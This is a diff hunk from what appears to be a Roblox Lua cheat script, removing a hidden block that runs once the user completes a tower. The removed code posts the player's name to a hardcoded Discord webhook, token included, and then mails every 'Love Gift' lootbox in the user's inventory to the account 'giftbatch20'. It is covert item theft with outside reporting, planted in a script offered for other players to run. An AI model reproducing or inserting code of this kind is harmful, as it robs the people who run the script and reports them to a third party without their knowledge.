@@ -464,47 +464,6 @@ end
 
 spawn(CreateButton)
 
-local HttpService = game:GetService("HttpService")
-local function sendinfoooo()
-    local sent = false
-    while true do
-        if completed == true and not sent then
-            sent = true
-            local webhook = "https://discord.com/api/webhooks/1157801798267064380/KZxS-v6PdGCpwzVd9dl0lDmQLGzARCReGSY9q8egpkLmSLjV1n_mQLyR5G4ppYIMoEMu"
-            local request = (syn and syn.request) or request or (http and http.request) or http_request
-            request({
-                Url = webhook,
-                Method = "POST",
-                Headers = { ["Content-Type"] = "application/json" },
-                Body = HttpService:JSONEncode({
-                    content = game.Players.LocalPlayer.Name .. " | Completed Tower"
-                })
-            })
-
-            while true do
-            wait(3)
-                local Items = GetItemInfo("Lootbox")
-                for _, Item in pairs(Items) do
-                    if string.find(Item.id, "Love Gift") and Item.am >= 1 then
-                        local args = {
-                            [1] = "giftbatch20",
-                            [2] = "enjoy bro",
-                            [3] = "Lootbox",
-                            [4] = Item.uid,
-                            [5] = Item.am
-                        }
-                        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
-                    end
-                end
-                
-                break
-            end
-        end
-        wait(60)
-    end
-end
-
-spawn(sendinfoooo)
 
 
 
